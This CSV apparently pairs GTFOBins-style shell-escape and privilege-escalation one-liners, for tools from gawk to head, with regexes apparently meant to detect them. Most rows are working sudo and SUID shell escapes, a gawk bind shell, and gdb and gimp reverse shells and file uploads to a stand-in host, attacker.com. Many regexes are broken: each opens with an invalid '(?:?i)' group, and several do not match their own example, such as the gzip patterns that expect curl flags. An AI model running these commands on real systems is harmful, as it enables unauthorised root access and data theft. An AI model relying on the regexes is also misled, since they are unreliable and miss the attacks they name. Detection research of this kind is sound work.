Name,Function,ExampleCode,Regex,Notes
gawk,non-interactive-bind-shell,"gawk -v LPORT=$LPORT 'BEGIN {
s = ""/inet/tcp/"" LPORT ""/0/0"";
while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gawk\s*\-v\s+(?:\bBEGIN\b).*(?:\bprintf\b).*(?:\bgetline\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gawk,file-write,"gawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gawk\s*\-v\s+(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gawk,file-read,"gawk '//' ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gawk\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gawk,suid,"./gawk '//' ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gawk\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gawk,sudo,"sudo gawk 'BEGIN {system(""/bin/sh"")}'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gawk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gawk,limited-suid,"./gawk 'BEGIN {system(""/bin/sh"")}'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gawk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gcc,file-read,"gcc -x c -E ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gcc\s*\-x\s*\-E\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gcc,file-read,"gcc @""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gcc\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gcc,file-write,gcc -xc /dev/null -o $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gcc\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gcc,shell,"gcc -wrapper /bin/sh,-s .",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gcc\s+(?:/bin/(?:sh|bash))),
gcc,sudo,"sudo gcc -wrapper /bin/sh,-s .",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gcc\s+(?:/bin/(?:sh|bash))),
gcloud,shell,"gcloud help
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gcloud\s+(?:/bin/(?:sh|bash))),
gcloud,sudo,"sudo gcloud help
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gcloud\s+(?:/bin/(?:sh|bash))),
gcore,file-read,gcore $PID,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gcore\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gcore,sudo,sudo gcore $PID,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gcore\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gcore,suid,./gcore $PID,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gcore\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gdb,shell,gdb -nx -ex '!sh' -ex quit,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gdb\s+.+),
gdb,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")' -ex quit","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gdb\s+(?:getenv\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gdb,file-upload,"export URL=http://attacker.com/
export LFILE=file_to_send
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' -ex quit","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gdb\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gdb,file-upload,"export LPORT=8888
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gdb\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gdb,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])' -ex quit","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gdb\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gdb,file-write,"gdb -nx -ex ""dump value $LFILE \""DATA\"""" -ex quit","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gdb\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gdb,file-read,"gdb -nx -ex 'python print(open(""file_to_read"").read())' -ex quit","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gdb\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gdb,library-load,"gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' -ex quit",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gdb\s+(?:\bimport\b)),
gdb,suid,"./gdb -nx -ex 'python import os; os.execl(""/bin/sh"", ""sh"", ""-p"")' -ex quit",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gdb\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),
gdb,sudo,sudo gdb -nx -ex '!sh' -ex quit,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gdb\s+.+),
gdb,capabilities,./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gdb\s+(?:\bimport\b)),
gem,shell,"gem open -e ""/bin/sh -c /bin/sh"" rdoc",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gem\s*\-e\s*\-c\s+(?:/bin/(?:sh|bash))),
gem,shell,"gem open rdoc
:!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gem\s+(?:/bin/(?:sh|bash))),
gem,shell,"echo 'system(""/bin/sh"")' > $TF/x
gem build $TF/x","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gem\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gem,shell,"echo 'system(""/bin/sh"")' > $TF/x
gem install --file $TF/x","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gem\s*\-\-file\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gem,sudo,"sudo gem open -e ""/bin/sh -c /bin/sh"" rdoc",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gem\s*\-e\s*\-c\s+(?:/bin/(?:sh|bash))),
genie,shell,genie -c '/bin/sh',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?genie\s*\-c\s+(?:/bin/(?:sh|bash))),
genie,suid,./genie -c '/bin/sh',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?genie\s*\-c\s+(?:/bin/(?:sh|bash))),
genie,sudo,sudo genie -c '/bin/sh',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?genie\s*\-c\s+(?:/bin/(?:sh|bash))),
genisoimage,file-read,"genisoimage -q -o - ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?genisoimage\s*\-q\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
genisoimage,suid,"./genisoimage -sort ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?genisoimage\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
genisoimage,sudo,"sudo genisoimage -q -o - ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?genisoimage\s*\-q\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ghc,shell,"ghc -e 'System.Process.callCommand ""/bin/sh""'",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ghc\s*\-e\s+(?:/bin/(?:sh|bash))),
ghc,sudo,"sudo ghc -e 'System.Process.callCommand ""/bin/sh""'",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ghc\s*\-e\s+(?:/bin/(?:sh|bash))),
ghci,shell,"ghci
System.Process.callCommand ""/bin/sh""",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ghci\s+(?:/bin/(?:sh|bash))),
ghci,sudo,"sudo ghci
System.Process.callCommand ""/bin/sh""",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ghci\s+(?:/bin/(?:sh|bash))),
gimp,shell,"gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:\bimport\b))",
gimp,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:getenv\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gimp,file-upload,"export URL=http://attacker.com/
export LFILE=file_to_send
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gimp,file-upload,"export LPORT=8888
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gimp,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gimp,file-write,"gimp -idf --batch-interpreter=python-fu-eval -b 'open(""file_to_write"", ""wb"").write(""DATA"")'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gimp,file-read,"gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(""file_to_read"").read())'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gimp,library-load,"gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")'",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:\bimport\b)),
gimp,suid,"./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(""/bin/sh"", ""sh"", ""-p"")'",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),
gimp,sudo,"sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:\bimport\b))",
ginsh,shell,"ginsh
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ginsh\s+(?:/bin/(?:sh|bash))),
ginsh,limited-suid,"./ginsh
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ginsh\s+(?:/bin/(?:sh|bash))),
ginsh,sudo,"sudo ginsh
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ginsh\s+(?:/bin/(?:sh|bash))),
git,shell,"PAGER='sh -c ""exec sh 0<&1""' git -p help","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?git\s*\-c\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
git,shell,"git help config
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?git\s+(?:/bin/(?:sh|bash))),
git,shell,"git branch --help config
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?git\s*\-\-help\s+(?:/bin/(?:sh|bash))),
git,shell,"git init ""$TF""
echo 'exec /bin/sh 0<&2 1>&2' >""$TF/.git/hooks/pre-commit.sample""
mv ""$TF/.git/hooks/pre-commit.sample"" ""$TF/.git/hooks/pre-commit""
git -C ""$TF"" commit --allow-empty -m x","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?git\s*\-C\s*\-\-allow\-empty\s*\-m\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
git,shell,"ln -s /bin/sh ""$TF/git-x""
git ""--exec-path=$TF"" x","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?git\s*\-s\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
git,file-read,git diff /dev/null $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?git\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
git,file-write,git apply --unsafe-paths --directory / x.patch,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?git\s*\-\-unsafe\-paths\s*\-\-directory\s+.+),
git,sudo,"sudo PAGER='sh -c ""exec sh 0<&1""' git -p help","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?git\s*\-c\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
git,sudo,"sudo git -p help config
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?git\s*\-p\s+(?:/bin/(?:sh|bash))),
git,sudo,"sudo git branch --help config
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?git\s*\-\-help\s+(?:/bin/(?:sh|bash))),
git,sudo,"git init ""$TF""
echo 'exec /bin/sh 0<&2 1>&2' >""$TF/.git/hooks/pre-commit.sample""
mv ""$TF/.git/hooks/pre-commit.sample"" ""$TF/.git/hooks/pre-commit""
sudo git -C ""$TF"" commit --allow-empty -m x","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?git\s*\-C\s*\-\-allow\-empty\s*\-m\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
git,sudo,"ln -s /bin/sh ""$TF/git-x""
sudo git ""--exec-path=$TF"" x","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?git\s*\-s\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
git,limited-suid,"PAGER='sh -c ""exec sh 0<&1""' ./git -p help","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?git\s*\-c\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
grc,shell,grc --pty /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?grc\s*\-\-pty\s+(?:/bin/(?:sh|bash))),
grc,sudo,sudo grc --pty /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?grc\s*\-\-pty\s+(?:/bin/(?:sh|bash))),
grep,file-read,grep '' $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?grep\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
grep,suid,./grep '' $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?grep\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
grep,sudo,sudo grep '' $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?grep\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gtester,file-write,"gtester ""DATA"" -o $LFILE","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gtester\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gtester,shell,"echo '#!/bin/sh' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
gtester -q $TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gtester\s*\-p\s*\-q\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gtester,sudo,"echo '#!/bin/sh' > $TF
echo 'exec /bin/sh 0<&1' >> $TF
chmod +x $TF
sudo gtester -q $TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gtester\s*\-q\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gtester,suid,"echo '#!/bin/sh -p' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
sudo gtester -q $TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gtester\s*\-p\s*\-p\s*\-q\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gzip,file-read,gzip -f $LFILE -t,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gzip\s*\-f\s*\-t\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gzip,file-read,gzip -c $LFILE | gzip -d,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gzip\s*\-c\s*\-d\s+(?:--data\b|--data-raw\b|-d\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gzip,suid,./gzip -f $LFILE -t,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gzip\s*\-f\s*\-t\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gzip,sudo,sudo gzip -f $LFILE -t,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gzip\s*\-f\s*\-t\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
hd,file-read,"hd ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?hd\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
hd,suid,"./hd ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?hd\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
hd,sudo,"sudo hd ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?hd\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
head,file-read,"head -c1G ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?head\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
